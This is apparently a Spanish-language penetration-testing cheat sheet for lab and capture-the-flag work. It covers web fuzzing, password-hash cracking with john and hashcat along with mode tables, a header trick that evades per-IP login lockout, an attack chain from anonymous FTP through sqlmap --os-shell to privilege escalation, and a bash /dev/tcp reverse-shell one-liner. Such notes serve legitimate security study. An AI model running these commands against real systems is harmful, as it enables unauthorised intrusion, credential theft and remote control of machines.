---
tags:
  - Chuletas
---
# Explotación

## Fuzzing web
- Directorios: `ffuf -u http://.../FUZZ -w /usr/share/wordlists/...`
- Subdominios / vhosts: `ffuf -u http://FUZZ.dominio/ -w ...` o
  `gobuster vhost -w subdomains.txt -u <url> --append-domain`
- Parámetros ocultos: `x8 -u http://... -X POST -w params.txt`

## Cracking de hashes (offline)

**1. Identificar el tipo:** `hashid '<hash>'` · `hash-identifier` · `name-that-hash`/`nth`.
Pistas por prefijo en `/etc/shadow`: `$1$` → md5crypt · `$5$` → sha256crypt · `$6$` →
sha512crypt · `$2a$`/`$2b$`/`$2y$` → bcrypt.

**2. Sintaxis base** (diccionario con rockyou; `W=/usr/share/wordlists/rockyou.txt`):

```bash
john --format=<FMT> --wordlist=$W hashes.txt      # crackear
john --show  --format=<FMT> hashes.txt            # ver crackeados

hashcat -m <MODO> -a 0 hashes.txt $W              # crackear (-a 0 = diccionario)
hashcat -m <MODO> hashes.txt --show               # ver crackeados
```

`-a 0` diccionario · `-a 3` máscara (fuerza bruta, p. ej. `?u?l?l?l?d?d`). Añade `--rules`
(John) o `-r rules/best64.rule` (hashcat) para mutar el diccionario.

**3. Tabla de códigos por tipo de hash:**

| Tipo de hash | Ejemplo / prefijo | hashcat `-m` | John `--format=` |
|---|---|---|---|
| MD5 (raw) | `d41d8cd9...` | `0` | `raw-md5` |
| SHA1 (raw) | — | `100` | `raw-sha1` |
| SHA256 (raw) | — | `1400` | `raw-sha256` |
| SHA512 (raw) | — | `1700` | `raw-sha512` |
| md5crypt (Linux viejo) | `$1$...` | `500` | `md5crypt` |
| sha256crypt (Linux) | `$5$...` | `7400` | `sha256crypt` |
| sha512crypt (Linux) | `$6$...` | `1800` | `sha512crypt` |
| bcrypt | `$2a$/$2b$/$2y$...` | `3200` | `bcrypt` |
| NTLM (hash NT de Windows) | 32 hex | `1000` | `nt` |
| LM (Windows legacy) | — | `3000` | `lm` |
| NetNTLMv1 (Responder) | — | `5500` | `netntlm` |
| NetNTLMv2 (Responder) | `user::DOM:...` | `5600` | `netntlmv2` |
| Kerberoast TGS-REP (RC4) | `$krb5tgs$23$...` | `13100` | `krb5tgs` |
| AS-REP Roast (RC4) | `$krb5asrep$23$...` | `18200` | `krb5asrep` |
| MySQL ≥4.1 (SHA1) | `*...` (41 hex) | `300` | `mysql-sha1` |
| MySQL 323 (viejo) | 16 hex | `200` | `mysql` |
| WPA/WPA2 (PMKID/EAPOL) | `.hc22000` | `22000` | `wpapsk` |

> Variantes Kerberos con AES: TGS `19600` (AES128) / `19700` (AES256); AS-REP `18200` es RC4.
> WPA antiguo (`.hccapx`): `-m 2500`.

**4. Archivos protegidos** — extraer el hash con los scripts `*2john` (vienen con John) y luego
crackear con John o hashcat:

| Archivo | Extraer hash | John `--format=` | hashcat `-m` |
|---|---|---|---|
| ZIP (ZipCrypto) | `zip2john a.zip > h` | `zip`/`pkzip` | `17200`/`17210` |
| ZIP (WinZip AES) | `zip2john a.zip > h` | — | `13600` |
| RAR3 | `rar2john a.rar > h` | `rar` | `12500` |
| RAR5 | `rar2john a.rar > h` | `RAR5` | `13000` |
| 7-Zip | `7z2john a.7z > h` | `7z` | `11600` |
| Office 2013+ | `office2john a.docx > h` | `office` | `9600` |
| PDF | `pdf2john a.pdf > h` | `pdf` | `10500`* |
| Clave SSH privada | `ssh2john id_rsa > h` | `ssh` | `22911`* |
| KeePass | `keepass2john a.kdbx > h` | `KeePass` | `13400` |

> *PDF: `10400`–`10700` según versión. Clave SSH: el modo hashcat varía con el cifrado
> (`22911`–`22931`); con John suele ir directo (`john h`).

**Online** (hashes rápidos/comunes, sin salt): [CrackStation](https://crackstation.net/),
[hashes.com](https://hashes.com/).

## Bypass de bloqueo / rate-limit por IP
Cuando un login bloquea tras varios intentos *por IP*, mandar una IP distinta en cada petición:
```
X-Forwarded-For: 9.9.9.9
X-Real-IP: 9.9.9.9
X-Client-IP: 9.9.9.9
```
En Burp Intruder, usar modo **Pitchfork/Cluster bomb** iterando la cabecera `X-Forwarded-For`
(números/IPs) a la vez que el diccionario de contraseñas. Ejemplo: [Nibbles](../red-team/walkthroughs/web.md#nibbles-htb).

## Claves SSH
- `ssh -i id_rsa user@ip -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa`
- `ssh-keygen -y -f id_rsa` (derivar pública)
- `chmod 600 id_rsa` antes de usarla

## Método FTP + Web (resumen reutilizable)
1. FTP anónimo → `get` del zip
2. Crackear zip (`zip2john` → `john`)
3. Crackear hash (hashid + hashcat, o CrackStation)
4. `sqlmap -u "http://...?x=1" --cookie="PHPSESSID=..." --os-shell`
5. Reverse shell → `cat /var/www/html/*.php` (buscar password)
6. `sudo -l`
7. `cat /etc/passwd | grep <servicio>`
8. SSH al usuario → escalar privilegios

## Reverse shell (recordatorio)
```
bash -c 'bash -i >& /dev/tcp/<IP>/<puerto> 0>&1'
```
Generadores: [revshells.com](https://www.revshells.com/). Escucha con `nc -lvnp <puerto>`.
